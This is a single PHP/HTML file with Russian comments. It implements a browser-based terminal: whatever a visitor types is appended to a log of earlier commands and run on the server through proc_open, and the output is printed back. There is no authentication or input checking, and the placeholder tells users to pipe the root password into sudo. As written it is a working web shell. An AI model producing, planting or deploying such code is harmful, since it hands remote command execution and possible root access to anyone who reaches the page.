      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>

        <meta name="viewport" content="width=device-width, user-scalable=no" />
       <style>
           .button {
  background-color: rgb(37, 37, 37);
  color: white;
  position: absolute; /* добавили */
  bottom: 0;
  right: 0;
  height: 5%;
  width: 9%;
}
.input {
  max-width: 90%;
  max-height: 5%;
  width: 90%;
  height: 5%;
  min-width: 90%;
  min-height: 5%;
  background-color: rgb(37, 37, 37);
  color: white;
  position: absolute; /* добавили */
  bottom: 0;
  font-size: auto;
}
	   
.callBack{

color: white;
top:0;
height:95%;
overflow-x: scroll;
overflow-y: scroll;
-ms-overflow-style: none;  /* IE и Edge */
scrollbar-width: none;  /* Firefox */
	   }
.callBack::-webkit-scrollbar {
  display: none;
}
       </style>

       
<!--  -->

<form method="POST" >
    <input type="text" class="input" style="margin: 0px; height: 38px; width: 1438px;" autofocus="autofocus" name="PH" id="subject" placeholder="for root:  echo <root password> | sudo -S <your command>">
       <input class="button" type="submit" name="my_form_submit_button"  value="➤"/>
      </form>








<?php







if ($_POST['PH'] == '?cls>'){

$fd = fopen("log.txt", 'w') or die("");
$str = "";
fwrite($fd, $str);
fclose($fd);


}
else {


$fd = fopen("log.txt", 'r') or die("");
while(!feof($fd))
{
$log = htmlentities(fgets($fd));

}
fclose($fd);



//      str_ends_with($string, 'Забор')
if ($log != '' && $_POST['PH'] != ''){

$ph = $log.'; echo; '.$_POST['PH'];

}
else {
$ph = $log.$_POST['PH'];
}
$cmd = $ph;
}


$fd = fopen("log.txt", 'w') or die("");
$str = "$cmd";
fwrite($fd, $str);
fclose($fd);

$descriptorspec = array(
        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        2 => array("pipe", "w") // stderr is a pipe that the child will read from
);

flush();

$process = proc_open($cmd, $descriptorspec, $pipes, './', array());
echo "<div class='callBack'><pre>";
if (is_resource($process)) { 
    while ($s = fgets($pipes[1])) {
        print $s;
        flush();
    }  
  while ($s = fgets($pipes[2])) {
        print "Error:".$s;
        flush();
    }
}
echo "</pre></div>";
?>
